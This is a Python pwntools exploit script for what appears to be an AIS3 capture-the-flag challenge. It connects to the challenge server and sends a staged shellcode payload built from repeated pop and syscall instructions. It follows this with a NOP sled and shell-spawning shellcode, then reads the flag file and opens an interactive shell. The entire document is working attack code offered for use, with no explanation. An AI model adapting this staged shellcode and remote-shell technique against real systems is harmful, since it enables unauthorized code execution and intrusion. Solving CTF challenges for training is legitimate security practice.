#!/usr/bin/env python
from pwn import *

# 

context.arch = 'amd64'

host = 'srv01.ctf.ais3.org'
port = 5522

y = remote( host , port )

# y.send( asm( 'pop rsi' ) * ( 0x3c8 ) + asm( 'pop rdx' ) * 5 + asm( 'syscall' ) * 1 + asm( 'nop' ) * 0x1863 )

y.send( asm( 'pop rsi' ) * ( 0x3b9 ) + asm( 'pop rdx' ) * 8 + asm( 'syscall' ) * 1 + asm( 'nop' ) * 0x1863 )
#y.send( asm( 'pop rsi' ) * 0x26f + asm( 'pop rdx' ) * 11 + asm( 'syscall' ) * 1 + asm( 'nop' ) * 0x0 )
sleep(0.1)

y.send( '\x90' * 0xa00 + asm( shellcraft.sh() ) )
sleep(0.1)
y.sendline( 'cat /home/`whoami`/flag' )

# cat /home/`whoami`/flag

y.interactive()